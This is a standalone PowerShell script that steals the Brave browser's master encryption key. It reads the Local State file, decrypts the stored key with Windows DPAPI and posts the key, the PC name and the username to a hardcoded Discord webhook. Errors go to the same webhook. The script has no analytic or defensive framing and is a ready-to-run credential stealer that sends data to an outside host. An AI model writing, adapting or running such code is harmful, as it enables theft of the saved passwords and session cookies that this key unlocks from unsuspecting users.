try {
    # Gather system info
    $username = $env:USERNAME
    $pcname = $env:COMPUTERNAME

    # Path to the Brave Browser's Local State file
    $localStatePath = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State"

    # Read and parse the JSON
    $json = Get-Content -Raw -Path $localStatePath | ConvertFrom-Json

    # Decode base64 and remove DPAPI prefix (first 5 bytes)
    $encryptedKeyWithPrefix = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
    $encryptedKey = $encryptedKeyWithPrefix[5..($encryptedKeyWithPrefix.Length - 1)]

    # Decrypt using Windows DPAPI
    Add-Type -AssemblyName System.Security
    $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

    # Convert to hex string
    $hex = ($decryptedKey | ForEach-Object { $_.ToString("x2") }) -join ''

    # Construct the message
    $message = @"
 **Brave Browser Master Key Extracted**
 PC Name: $pcname
 Username: $username

 Brave Browser Key: $hex
"@

    # Send the message to Discord
    $payload = @{ content = $message } | ConvertTo-Json -Compress
    Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1374825778193236008/26E8HcYdvmSp3BaKLu_5O9rC5H_xOD9-Z4Pw_BDH1Ns-5cWZd-7WMTxab29tgK3e8B9E' -Method Post -Body $payload -ContentType 'application/json'
}
catch {
    # Send error info to Discord if anything goes wrong
    $err = @{ content = "❌ Error: $($_.Exception.Message)" } | ConvertTo-Json -Compress
    Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1374825778193236008/26E8HcYdvmSp3BaKLu_5O9rC5H_xOD9-Z4Pw_BDH1Ns-5cWZd-7WMTxab29tgK3e8B9E' -Method Post -Body $err -ContentType 'application/json'
}
